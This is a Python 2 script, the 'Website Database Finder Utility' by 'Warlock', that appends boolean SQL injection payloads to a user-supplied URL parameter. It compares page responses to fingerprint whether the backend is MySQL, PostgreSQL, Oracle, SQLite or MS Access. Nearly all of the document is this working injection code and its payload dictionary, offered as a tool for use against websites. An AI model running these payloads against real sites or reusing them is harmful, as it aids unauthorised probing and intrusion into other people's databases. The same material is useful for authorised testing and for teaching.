import urllib2
import urllib
import time
import os
import sys
import re
import subprocess

print "\n\t\t#################################################"
print "\t\t#                                               #"
print "\t\t#          WEBSITE DATABASE FINDER UTILITY      #"
print "\t\t#                   BY WARLOCK                  #"
print "\t\t#                                               #"
print "\t\t#################################################"

u=raw_input('\n[+]ENTER ANY DATABASE RELATED URL (e.g. http://www.xyz.com/index.php?id=) :')

datapay = {'MYSQL_1' : "conv('a',16,2)=conv('a',16,2)",
           'MYSQL_2' : "connection_id()=connection_id()",
           'MYSQL_3' : "crc32('MySQL')=crc32('MySQL')",
           'POSTGRE_4' : "5::int=5",
           'POSTGREY_44' : "5::integer=5",
           'POSTGRE_5' : "pg_client_encoding()=pg_client_encoding()",
           'POSTGRE_6' : "get_current_ts_config()=get_current_ts_config()",
           'POSTGRE_7' : "quote_literal(42.5)=quote_literal(42.5)",
           'POSTGRE_8' : "current_database()=current_database()",
           'ORACEL_9' : "ROWNUM=ROWNUM",
           'ORACLE_10' : "RAWTOHEX('AB')=RAWTOHEX('AB')",
           'ORACLE_11' : "LNNVL(0=123)",
           'SQLITE_12' : "sqlite_version()=sqlite_version()",
           'SQLITE_13' : "last_insert_rowid()>1",
           'SQLITE_14' : "last_insert_rowid()=last_insert_rowid()",
           'MSACCESS_15' : "val(cvar(1))=1",
           'MSACCESS_16' : "IIF(ATN(2)>0,1,0)+BETWEEN+2+AND+0",
           'MSACCESS_17' : "cdbl(1)=cdbl(1)"}
           
bet='+and+'

import requests
try:    
    r = requests.head(u)
    html = urllib2.urlopen(u).read()
    
    code = urllib2.urlopen(u).getcode()
    print '[+]RESPONSE CODE IS :',code
    if code == 200:
            
            for type,database in datapay.items():
                    main=u+bet+database
                    print '\n[+]TRYING PAYLOAD WITH URL : ',main
                    r = requests.head(main)
                    response = r=urllib2.urlopen(main).read()
                    
                    html1 = urllib2.urlopen(main).read()
                    
                    code1 = urllib2.urlopen(main).getcode()
                    print '[+]RESPONSE CODE IS :',code1
                    try:
                        if  code1 == 200:
                                if html == html1:
                                        print "\n\t[+]POSSIBLE DATABASE FOUND :",type
                                        break
                                    
                                else:
                                        pass
                        else:
                                pass
                    except:
                        pass
                            
            
                    
    

except requests.ConnectionError:
    print'\n[-]CHECK THE URL AGAIN'


print"\n[+]I ALSO ADVICE YOU TO TRY MANUALLY AND COMPARE THE RESULT WITH ME...."
raw_input("\n[+]PRESS ANY KEY TO EXIT")
